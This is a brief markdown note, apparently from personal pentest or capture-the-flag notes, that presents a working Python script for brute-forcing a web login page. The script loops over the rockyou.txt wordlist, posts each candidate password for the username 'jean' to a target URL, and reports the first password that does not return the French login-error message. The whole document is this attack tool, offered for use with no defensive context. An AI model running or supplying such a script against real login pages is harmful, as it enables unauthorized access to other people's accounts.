
#### Script

- Python script to bruteforce a password on an authentification page

```python
from bs4 import BeautifulSoup, NavigableString, Tag
from urllib.request import Request, urlopen
import requests
import sys

url = "[URL]"

password_file = "rockyou.txt"
file = open(password_file,  encoding='latin-1')
username = "jean"
for password in file.readlines():
    password = password.strip("\n")
    data = {'username':username, 'password':password, "Login":'submit'}
    send_data_url = requests.post(url, data=data)
    if "Erreur de connexion" in str(send_data_url.content):
        print("[*] Attempting password: %s" % password)
    else:
        print("[*] Password found: %s " % password)
        sys.exit()
```

